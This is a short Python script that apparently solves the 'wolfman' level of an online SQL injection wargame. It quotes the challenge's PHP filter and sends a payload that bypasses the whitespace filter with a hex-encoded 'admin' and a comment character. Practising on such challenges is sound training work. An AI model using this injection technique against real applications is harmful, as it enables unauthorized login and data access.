#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Wolfman

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");
    $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
    if($result['id'] == 'admin') solve("wolfman");
    """

    url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    payload = "'||id=0x61646d696e#"

    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()

    if 'Clear!' in response:
        print('\nWOLFMAN Clear!')


if __name__ == '__main__':
    main()
